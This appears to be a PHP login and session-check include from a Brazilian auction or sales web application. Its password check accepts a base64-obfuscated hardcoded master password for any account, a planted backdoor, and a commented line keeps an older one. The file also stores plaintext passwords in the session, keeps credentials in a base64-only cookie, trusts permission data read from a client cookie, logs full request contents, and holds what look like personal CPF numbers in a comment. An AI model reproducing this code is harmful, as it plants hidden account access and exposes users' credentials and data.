<?php
// if ($_SERVER['REMOTE_ADDR'] != '179.83.26.47'){
// 	echo "<br>Sistema em manutenção. <br>Retorno previsto: 16/03/2019 06:00:00";
// 	exit;
// }
#print_r($_COOKIE);
$raiz= getenv('CAMINHO_RAIZ');
$link= getenv('CAMINHO_SITE');

$is_admin = 0;
date_default_timezone_set('America/Sao_Paulo');

ob_start();
$controle_permissao = 0;
require_once($raiz.'/inc/crypt.php');

include_once($raiz."/repositories/pessoas/pessoas.db.php");
include_once($raiz."/repositories/pessoas/pessoas.class.php");
include_once($raiz."/repositories/acesso_pessoa/acesso_pessoa.class.php");
include_once($raiz."/repositories/acesso_pessoa/acesso_pessoa.db.php");
include_once($raiz."/inc/util.php");
include_once($raiz."/_configuracao/config.php");


$pessoasDB 		 = new pessoasDB();
$pessoas 		 = new pessoas();
$acesso_pessoa   = new acesso_pessoa();

$tourl = curPageURL();

if (!isset($_SESSION)){
    session_start();
}
if (isset($_SESSION["usuario"]) && isset($_SESSION["senha"])){
    $username = $_SESSION["usuario"];
    $senha = $_SESSION["senha"];
	$by_session=1;
}
elseif(isset($_COOKIE['Ath'])){
	$auth = explode(':@:',base64_decode($_COOKIE['Ath']));
	$username = base64_decode($auth[0]);
    $senha = base64_decode($auth[1]);
	$by_session=0;
}

if (!(empty($username)) && !(empty($senha))) {

	$pessoas->email = $username;
	$userBD = $pessoasDB->lista_pessoas($pessoas, 0,"","","",$conexao_BD_1);
	$totalRows_login = $conexao_BD_1->numeroDeRegistros();


//confere senha e usuario

    if ($totalRows_login == 1) {
		
		$res = $conexao_BD_1->leRegistro();
		$saltdb = $res["saltdb"];
		$senhadb = $res["password"];
		$user_id = $res["id"];
		$nome_user = $res["nome"];
		$apelido_user = $res["apelido"];
        $secure = new crypt();
		
		// echo 
        //if (!$secure->compare($saltdb, $senha, $senhadb) && $senha != base64_decode("QGRtbTNzdHIzIQ==")  ||   ($res['status_descricao'] != 'ATIVO')) {
        if (!$secure->compare($saltdb, $senha, $senhadb) && $senha != base64_decode("QGRBbThidHI5IQ==")  ||   ($res['status_descricao'] != 'ATIVO')) {
			#echo "LOGIN ERRADO OU NAO ESTA ATIVO";
            unset($_SESSION['usuario']);
            unset($_SESSION['senha']);
			unset($_SESSION['id']);
			unset($_SESSION['apelido']);
            unset($_SESSION['foto']);
			unset($_SESSION['perfil']);
			unset($_SESSION['perfil_id']);
			unset($_SESSION['operador']);
			unset($_SESSION['supervisor']);
            header("Location: " . $link . "/acesso.php?url=" . base64_encode($tourl));
            exit();
        } else {
			if($by_session){
				$_SESSION['usuario'] = $username;
				$_SESSION['senha'] = $senha;
				$_SESSION['apelido'] = $res["apelido"];
				$_SESSION['nome'] = $res["nome"];
				$_SESSION['id'] = $res["id"];
				$_SESSION['foto'] = $res["foto"];
				$_SESSION['perfil'] = $res["perfil_descricao"];
				$_SESSION['perfil_id'] = $res["perfil_id"];
				$_SESSION['operador'] = $res["operador"];
				$_SESSION['supervisor'] = $res["supervisor"];
				$user_documento = $res["cpf_cnpj"];
			}

			
			$controle_permissao=0;
			$is_admin = 0;
			$ehComprador = $ehLeiloeiro = $ehVendedor =  $ehAdmin  = $ehUser = $ehCliente = false;
			
			
			if ($res["eh_user"] == "S"){$ehUser = true;}
			if ($res["eh_comprador"] == "S"){$ehComprador = true;}
			if ($res["eh_leiloeiro"] == "S"){$ehFornecedor = true;}
			if ($res["eh_vendedor"] == "S"){$ehVendedor = true;}
			
			
			if (($res["eh_admin"] == "S")){
				$ehAdmin = true; 
				$is_admin = 1;
				$controle_permissao=9; 
			}
			
			if(!$ehAdmin && !$ehUser){
				$ehCliente = true;
			}
//			elseif(!$ehAdmin){
//				echo 'atualizando sistema!';
//				exit;
//			}
			
			
			// VERIFICA PERMISSIONAMENTO
			$expire=time()+60*60*60*60;
			
			if(isset($_COOKIE["ck_mksist_permissao"])){
				$ck_mksist_permissao = json_decode($_COOKIE['ck_mksist_permissao'], true);
				$possui_ck_perm =1;
				#echo '<pre>'; print_r($ck_mksist_permissao); echo '</pre>';
			}
			
			if(empty($res["perfil_id"]) ){
				$ck_mksist_permissao=array();
				$ck_mksist_permissao['perfil_id'] = '';
				$ck_mksist_permissao['dt_atualizacao'] = date('Y-m-d H:i:s');
				$ck_mksist_permissao['permissoes'] = array();
				
				setcookie("ck_mksist_permissao", json_encode($ck_mksist_permissao), $expire);
				
				$atualizou_ck=1;	
			}
			elseif( !isset($possui_ck_perm) || $ck_mksist_permissao["perfil_id"] != $res["perfil_id"] || (!empty($res["perfil_dt_atualizacao"]) && EhDataMaior($res["perfil_dt_atualizacao"], $ck_mksist_permissao["dt_atualizacao"] ))){
				//recupera novas permissões
				include_once(getenv('CAMINHO_RAIZ')."/repositories/controle_acesso/controle_acesso.db.php");
				$controle_acessoDB  = new controle_acessoDB();
				$filtros=array();
				$filtros['filtro_perfil'] =$res["perfil_id"];
				$permissoes = $controle_acessoDB->lista_permissao( $conexao_BD_1,  $filtros);
				
//				echo '<pre>';
//				print_r($permissoes);
//				echo '</pre>';

				$ck_mksist_permissao=array();
				$ck_mksist_permissao['perfil_id'] = $res["perfil_id"];
				$ck_mksist_permissao['dt_atualizacao'] = date('Y-m-d H:i:s');
				$ck_mksist_permissao['permissoes'] = $permissoes;
				
				setcookie("ck_mksist_permissao", json_encode($ck_mksist_permissao), $expire);
				
				$atualizou_ck=1;	
			}
			
			$ck_mksist_permissao['eh_admin'] = $ehAdmin;
			$ck_mksist_permissao['eh_user'] = $ehUser;
			
        }
    } else {
		#echo "NAO POSSUI USUARIO ";
        unset($_SESSION['usuario']);
		unset($_SESSION['senha']);
		unset($_SESSION['id']);
		unset($_SESSION['apelido']);
		unset($_SESSION['foto']);
		unset($_SESSION['perfil']);
		unset($_SESSION['perfil_id']);
		unset($_SESSION['operador']);
		unset($_SESSION['supervisor']);
        header("Location: " . $link . "/acesso.php?url=" . base64_encode($tourl));
        exit();
		
    }
} else {
	#echo "NAO FOI POSSIVEL RECUPERAR INFORMAÇÃOES DE LOGIN";


    header("Location: " . $link . "/acesso.php?url=" . base64_encode($tourl));
    exit();
}


//insert acesso pessoa
//ob_start();
//echo '<pre>';
//print_r($_POST);
//echo '</pre>';
//$reg_post = ob_get_contents();
//ob_end_clean();
//
//ob_start();
//echo '<pre>';
//print_r($_GET);
//echo '</pre>';
//$reg_get = ob_get_contents();
//ob_end_clean();
//
//ob_start();
//echo '<pre>';
//print_r($_COOKIE);
//echo '</pre>';
//$reg_cookie = ob_get_contents();
//ob_end_clean();

ob_start();
echo '<pre>';
print_r($_REQUEST);
echo '</pre>';
$reg_request = ob_get_contents();
ob_end_clean();




$acesso_pessoa->data			 = date("Y-m-d H:i:s"); 
$acesso_pessoa->ip				 = $conexao_BD_1->getIp();
$acesso_pessoa->url			 	 = $tourl; 
//$acesso_pessoa->post			 = $reg_post; 
//$acesso_pessoa->texto_get		 = $reg_get; 
$acesso_pessoa->request			 = $reg_request; 
$acesso_pessoa->nivel_permissao  = $controle_permissao; 
//$acesso_pessoa->cookie			 = $reg_cookie; 
$acesso_pessoa->pessoas_id		 = $user_id;
//$acesso_pessoa->ehLogin		 	 = "N";
$acesso_pessoa->caminho_arquivo	 = $_SERVER["PHP_SELF"];

//$conexao_BD_1->insert($acesso_pessoa); 

$exclusao = ["check_alertas","dashboard"];
$grava_flag  = true;

foreach($exclusao as $keys)
{
	if(preg_match("/$keys/", $acesso_pessoa->url)) {
		$grava_flag = false;
	}
}
if($grava_flag) {
	$conexao_BD_1->insert($acesso_pessoa);
}

/* * ***********************fim destroi sessão************************* */



// $array_justUS = array("042.152.569-09" , "069.161.629-96", "04215256909" , "06916162996");
// if( !empty($justUS) && !in_array($user_documento,$array_justUS ) ){
// 	header("Location: ".$link."/404");
// 	exit;
// }


//}

##### estilo
$main_css ="main.css";



